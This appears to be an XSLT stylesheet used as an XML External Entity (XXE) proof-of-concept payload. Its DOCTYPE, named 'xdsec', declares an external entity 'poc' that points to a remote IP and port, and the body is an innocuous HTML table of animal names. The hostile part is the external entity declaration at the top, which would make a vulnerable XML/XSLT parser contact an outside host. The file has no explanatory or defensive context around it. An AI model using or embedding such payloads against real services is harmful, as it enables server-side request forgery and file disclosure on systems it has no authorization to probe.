<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xdsec[
        <!ENTITY poc SYSTEM  "http://111.222.111.222:12345/test.txt">
        ]>

<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <html>
            <h2>
            </h2>
            <body>
                <table width="100%" border="1dpx" class="table table-striped mt40">
                    <tr bgcolor="#5cacee">
                        <td align="left">Mainkind</td>
                        <td align="left">Monkey</td>
                        <td align="left">Pig</td>
                        <td align="left">celestial</td>
                        <td class="last-col" align="left">Horse</td>
                    </tr>
                </table>
            </body>
        </html>

    </xsl:template>
</xsl:stylesheet>